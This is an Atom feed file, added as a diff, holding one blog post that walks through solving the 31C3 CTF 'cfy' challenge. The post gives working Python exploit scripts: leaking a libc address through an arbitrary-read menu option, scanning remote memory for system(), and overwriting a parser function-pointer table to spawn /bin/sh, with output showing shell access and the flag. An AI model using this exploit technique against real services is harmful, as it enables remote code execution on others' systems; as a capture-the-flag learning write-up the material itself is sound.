@@ -1,0 +1,349 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: 31c3 | staring into /dev/null]]></title>
+  <link href="http://barrebas.github.io/blog/categories/31c3/atom.xml" rel="self"/>
+  <link href="http://barrebas.github.io/"/>
+  <updated>2014-12-30T11:05:59+01:00</updated>
+  <id>http://barrebas.github.io/</id>
+  <author>
+    <name><![CDATA[barrebas]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[31C3 CTF - Cfy]]></title>
+    <link href="http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy/"/>
+    <updated>2014-12-29T12:06:07+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy</id>
+    <content type="html"><![CDATA[<p>Man, 31C3 CTF was tough. I managed to get this flag, worth 10 points. Seems I need to keep learning ;] Let&rsquo;s have a look at <code>cfy</code>.</p>
+
+<!-- more -->
+
+
+<p></p>
+
+<p>We&rsquo;re given the binary and a place to connect to. Upon connecting with <code>nc</code>, we see the following:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/31c3$ nc 188.40.18.73 3313
+What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit
+</code></pre>
+
+<p>With option 2, we have an arbitrary read ability, but we have to pass in the pointer in raw hex. This allows us to leak <code>libc</code> address from the got:</p>
+
+<pre><code class="python">#!/usr/bin/python
+
+import struct 
+import time
+import socket
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('188.40.18.73', 3313))
+
+
+def p(x):
+    return struct.pack("L", x)
+
+addr = 0x601020
+
+payload = ""
+payload += "2\n"
+payload += p(addr)  # printf
+payload += "\n"
+
+print s.recv(1000)
+s.send(payload)
+time.sleep(0.5)
+print s.recv(1000)
+</code></pre>
+
+<p>Given us the ouput:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/31c3/cfy$ python read.py 
+What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit
+
+
+Please enter your number: dec: 140512731112416
+hex: 0x7fcbab6ca3e0
+
+What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit
+</code></pre>
+
+<p>Unfortunately, running the python script again shows a different output value. This means that ASLR is enabled. Furthermore, I didn&rsquo;t know what version of <code>libc</code> was running!</p>
+
+<p>I turned my attention to gaining code execution. This was more trivial, although it wasn&rsquo;t a straight-forward buffer overflow. The binary asks the user for a choice. That choice is converted from a string to an int. From this int, the binary looks up the relevant code to handle the request:</p>
+
+<pre><code>  4008af: 48 c1 e0 04           shl    rax,0x4         ; multiply value by 16
+  4008b3: 48 05 80 10 60 00     add    rax,0x601080    ; address of parsers, see below
+  4008b9: 48 8b 00              mov    rax,QWORD PTR [rax]
+  4008bc: bf e0 10 60 00        mov    edi,0x6010e0    ; address of buf, see below
+  4008c1: ff d0                 call   rax             ; gain code exec here!
+</code></pre>
+
+<p>There is no check performed on the value in <code>rax</code>. If we pass in a normal value, like <code>2</code>, the binary fetches the corresponding parser here:</p>
+
+<pre><code>gdb-peda$ p parsers
+$1 = { {
+    fn = 0x40073d &lt;from_hex&gt;, 
+    desc = 0x4009b4 "parse from hex"
+  }, {
+    fn = 0x400761 &lt;from_dec&gt;, 
+    desc = 0x4009c3 "parse from dec"
+  }, {
+    fn = 0x400785 &lt;from_ptr&gt;, 
+    desc = 0x4009d2 "parse from pointer"
+  } }
+</code></pre>
+
+<p>But look here: <code>buf</code> is almost right behind <code>parsers</code>:</p>
+
+<pre><code class="">gdb-peda$ x/40wx parsers
+0x601080 &lt;parsers&gt;:             0x0040073d  0x00000000  0x004009b4  0x00000000
+0x601090 &lt;parsers+16&gt;:          0x00400761  0x00000000  0x004009c3  0x00000000
+0x6010a0 &lt;parsers+32&gt;:          0x00400785  0x00000000  0x004009d2  0x00000000
+0x6010b0:                       0x00000000  0x00000000  0x00000000  0x00000000
+0x6010c0 &lt;stdout@@GLIBC_2.2.5&gt;: 0xf7dd77a0  0x00007fff  0xf7dd76c0  0x00007fff
+0x6010d0 &lt;completed.6972&gt;:      0x00000000  0x00000000  0x00000000  0x00000000
+0x6010e0 &lt;buf&gt;:                 0x00000000  0x00000000  0x00000000  0x00000000
+0x6010f0 &lt;buf+16&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
+0x601100 &lt;buf+32&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
+0x601110 &lt;buf+48&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
+</code></pre>
+
+<p>If we somehow load <code>buf</code> with pointers to code we want to execute, then pass in a large value at the prompt, the code will fetch the parser address from the <code>buf</code> section and we have control over execution:</p>
+
+<pre><code class="bash">gdb-peda$ r
+What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit
+7   # give bigger number!
+
+Please enter your number: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x6161616161616161 ('aaaaaaaa')
+RBX: 0x0 
+RCX: 0xfbad2288 
+RDX: 0x6010e0 ('a' &lt;repeats 52 times&gt;, "\n")
+RSI: 0x7ffff7ff7035 --&gt; 0x0 
+RDI: 0x6010e0 ('a' &lt;repeats 52 times&gt;, "\n")
+RBP: 0x7fffffffe4b0 --&gt; 0x0 
+RSP: 0x7fffffffe4a0 --&gt; 0x7ffffe590 
+...snip...
+[-------------------------------------code-------------------------------------]
+   0x4008b3 &lt;main+167&gt;: add    rax,0x601080
+   0x4008b9 &lt;main+173&gt;: mov    rax,QWORD PTR [rax]
+   0x4008bc &lt;main+176&gt;: mov    edi,0x6010e0
+=&gt; 0x4008c1 &lt;main+181&gt;: call   rax
+   0x4008c3 &lt;main+183&gt;: mov    QWORD PTR [rbp-0x8],rax
+   0x4008c7 &lt;main+187&gt;: mov    rax,QWORD PTR [rbp-0x8]
+   0x4008cb &lt;main+191&gt;: mov    rsi,rax
+   0x4008ce &lt;main+194&gt;: mov    edi,0x400a3d
+Guessed arguments:
+arg[0]: 0x6010e0 ('a' &lt;repeats 52 times&gt;, "\n")
+..snip...
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000004008c1 in main ()
+</code></pre>
+
+<p>Excellent. Now what pointer should we store in <code>buf</code>? I couldn&rsquo;t make a ROP chain, for I had no control over the stack. The obvious thing to do was to return to <code>system()</code> with <code>/bin/sh</code> as argument. But where was <code>system()</code> located?</p>
+
+<p>I had no idea what <code>libc</code> version was running. I did have an arbitrary read primitive though. I had downloaded <code>libc-2.19</code> and from the addresses of <code>printf</code> and <code>puts</code> (both available in the GOT) I deduced that this <em>wasn&rsquo;t</em> the correct version. However, I decided to scan the remote binary&rsquo;s libc for signature bytes of <code>system()</code>. I assumed it started with these bytes:</p>
+
+<pre><code>bas@tritonal:~/tmp/31c3/cfy$ gdb ./libc-2.19.so 
+GNU gdb (GDB) 7.4.1-debian
+...snip...
+gdb-peda$ x/8b system
+0x46530 &lt;system&gt;:   0x48    0x85    0xff    0x74    0xb 0xe9    0x26    0xfb
+</code></pre>
+
+<p>So I wrote a small scanner in python. This scanner will dump bytes from libc, searching for <code>ff85</code> in the output.</p>
+
+<pre><code class="python">#!/usr/bin/python
+
+import struct, time, re
+
+def p(x):
+    return struct.pack("L", x)
+
+payload = ""
+payload += "2\n"
+payload += p(0x601020)  # printf
+payload += "\n"
+
+import socket
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('188.40.18.73', 3313))
+
+print s.recv(1025)
+s.send(payload)
+time.sleep(1.5)
+data = s.recv(1000)
+
+PRINTF = -1
+print data
+m = re.search(r'hex: (.*)', data)
+if m:
+    PRINTF = m.group(1)
+
+OFFSET=63580    # guesstimated from real libc
+for i in range(5000):
+    payload = ""
+    payload += "2\n"
+    payload += p(int(PRINTF, 16)-OFFSET-i)
+    payload += "\n"
+
+    s.send(payload)
+
+    data = s.recv(200)
+    print data
+    print i
+
+    if 'ff85' in data: # part of test rdi, rdi
+            print "[!] found possible offset for system(): printf-%d" % (int(PRINTF,16)-(int(PRINTF, 16)-OFFSET-i))
+            print "[!] system @ %s" % hex(int(PRINTF, 16)-OFFSET-i)
+            raw_input()
+</code></pre>
+
+<p>It gave a lot of possible addresses, and once I thought I had <code>system()</code> but it was the wrong. I chose a reasonble offset to start from (based on libc 2.19) and ran the script. I stumbled upon the following output:</p>
+
+<pre><code>...snip...
+85
+[!] found possible offset for system(): printf-63665
+[!] system @ 0x7f4df0086b2f
+
+
+Please enter your number: dec: 2803784840145881088
+hex: 0x26e90b74ff854800
+
+What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit
+
+86
+[!] found possible offset for system(): printf-63666
+[!] system @ 0x7f4df0086b2e
+</code></pre>
+
+<p>At <code>printf-63665</code>, libc indeed has the first few bytes of <code>system()</code>. It started with a <code>00</code> byte, so I decreased the value by one and plugged that value into a script.</p>
+
+<pre><code class="python">#!/usr/bin/python
+
+import struct, time, re, telnetlib, socket
+
+def p(x):
+    return struct.pack("L", x)
+
+# leak printf address in libc via GOT pointer
+payload = ""
+payload += "2\n"
+payload += p(0x601020)  # printf@plt
+payload += "\n"
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('188.40.18.73', 3313))
+
+print s.recv(1025)
+s.send(payload)
+time.sleep(0.5)
+data = s.recv(1000)
+
+PRINTF = -1
+print data
+m = re.search(r'hex: (.*)', data)
+if m:
+    PRINTF = m.group(1)
+
+print "[+] found printf: %x" % int(PRINTF, 16)
+SYSTEM = int(PRINTF, 16) - 63664
+print "[+] system at %x" % int(SYSTEM)
+
+# spam system into buf
+payload = ""
+payload += "1\n"        
+payload += p(SYSTEM)    # address of system() will be stored in buf
+payload += p(SYSTEM)    # buf+8
+payload += p(SYSTEM)    # buf+16
+payload += "\n"
+
+s.send(payload)
+print s.recv(200)
+
+payload = ""
+payload += "7\n"        # use an address further into buf (parsers+7*16)
+payload += "/bin/sh\n"  # because this will overwrite the first few bytes
+
+s.send(payload)         # send payload, causing it to call system('/bin/sh')
+
+t = telnetlib.Telnet()  # interact with spawned shell
+t.sock = s
+t.interact()
+</code></pre>
+
+<p>I ran the script and crossed my fingers:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/31c3/cfy$ python exploit.py 
+What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit
+
+
+Please enter your number: dec: 140686779126752
+hex: 0x7ff4317e93e0
+
+What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit
+
+[+] found printf: 7ff4317e93e0
+[+] system at 7ff4317d9b30
+
+Please enter your number: 
+dec: 0
+hex: 0x0
+
+What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit
+
+Please enter your number: id
+uid=1001(cfy) gid=1001(cfy) groups=1001(cfy)
+cat /home/cfy/flag
+THANK YOU WARIO!
+
+BUT OUR PRINCESS IS IN
+ANOTHER CASTLE!
+
+Login: cfy_pwn // 31C3_G0nna_keep&lt;on&gt;grynding
+</code></pre>
+
+<p>So the flag was <code>31C3_G0nna_keep&lt;on&gt;grynding</code>. I thought this was quite tough based on the amount of points&hellip;</p>
+]]></content>
+  </entry>
+  
+</feed>
